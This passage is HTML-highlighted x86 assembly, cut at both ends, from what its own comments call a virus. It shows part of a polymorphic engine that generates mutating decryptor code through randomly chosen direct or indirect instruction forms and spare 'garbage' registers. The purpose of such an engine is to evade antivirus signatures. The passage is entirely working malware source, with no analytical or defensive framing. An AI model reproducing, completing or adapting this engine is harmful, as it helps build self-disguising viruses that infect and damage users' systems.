                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AdditionToBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_SetPART_THREEtoMemory</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; Function to generate a MOV Reg,Value (with our pseudoassembler).</span><span class="sc0">
</span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0"> </span><span class="sc1">; Get direct or indirect method</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; WEIGHT_X010</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0"> </span><span class="sc1">; If indirect, we get a</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                      </span><span class="sc1">; garbage register, move the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; value to it and after that</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Direct</span><span class="sc0">                   </span><span class="sc1">; we move the register to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; the one that we want.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; If direct, then that: direct :)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoMOVRegValue</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes an ADD Reg,Value in the same way that in the function</span><span class="sc0">
</span><span class="sc1">;; above: direct will add the value to the register, while indirect will</span><span class="sc0">
</span><span class="sc1">;; move the value to a garbage register and after that will add that register</span><span class="sc0">
</span><span class="sc1">;; to the one that we want to modify.</span><span class="sc0">
</span><span class="sc5">Poly_DoADDRegValue</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X008_11</span><span class="sc0">  </span><span class="sc1">; Select direct or indirect</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; Move the value to add to a garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">       </span><span class="sc1">; ADD Reg,Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
         </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; ADD Reg,Value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoADDRegValue</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Just that: MOV Mem,Reg. The memory is the DATA section of the decryptor,</span><span class="sc0">
</span><span class="sc1">;; and the offset within is in EBX.</span><span class="sc0">
</span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">        </span><span class="sc1">; Select direct or indirect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; Make MOV GarbageReg,Reg and substitute</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">  </span><span class="sc1">; the original register by</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; the garbage one.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">      </span><span class="sc1">; MOV Mem,Reg pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">; Get the offset and add the DATA sect.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; of the virus.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoMOVMemReg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Just like above, but inversed.</span><span class="sc0">
</span><span class="sc5">Poly_DoMOVRegMem</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0">   </span><span class="sc1">; Direct or indirect</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0"> </span><span class="sc1">; Use this garbage register.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Direct</span><span class="sc0">         </span><span class="sc1">; Make the MOV GarbageReg,Mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">       </span><span class="sc1">; MOV Reg,GarbageReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">       </span><span class="sc1">; Make the instruction directly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; EBX is an offset within DATA sect. of</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; the decryptor.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoMOVRegMem</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Make a PUSH Reg</span><span class="sc0">
</span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Make a POP Reg</span><span class="sc0">
</span><span class="sc5">Poly_DoPOPReg</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoPOPReg</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Make a PUSH Value</span><span class="sc0">
</span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; WEIGHT_X014</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0"> </span><span class="sc1">; Make it directly or indirectly.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">      </span><span class="sc1">; directly just pushes the value, and</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; indirectly first moves the value to a</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">      </span><span class="sc1">; garbage register and then pushes that</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; register.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoPUSHValue</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function will perform a XOR Reg,Reg, both directly and indirectly</span><span class="sc0">
</span><span class="sc1">;; (with a garbage register), like the functions above.</span><span class="sc0">
</span><span class="sc5">Poly_DoXORRegReg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean_X012_15</span><span class="sc0"> </span><span class="sc1">; WEIGHT_X015</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Make MOV GarbageReg,SourceReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">      
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; Subsitute the SourceReg by the garbage</span><span class="sc0">
                                      </span><span class="sc1">; register.</span><span class="sc0">
    </span><span class="sc5">@@Single</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">      </span><span class="sc1">; Make XOR DestinyReg,GarbageReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_DoXORRegReg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function gets a register that is not used by the decryptor (or</span><span class="sc0">
</span><span class="sc1">;; whatever the code we are doing). Concretely, it gets a random register from</span><span class="sc0">
</span><span class="sc1">;; 0 to 7, and if it's not ESP, IndexReg, CounterReg or BufferReg, then it</span><span class="sc0">
</span><span class="sc1">;; returns it (it's not used/reserved).</span><span class="sc0">
</span><span class="sc5">Poly_GetAGarbageRegister</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IndexRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CounterRegister</span><span class="sc4">]</span><span class="sc0">
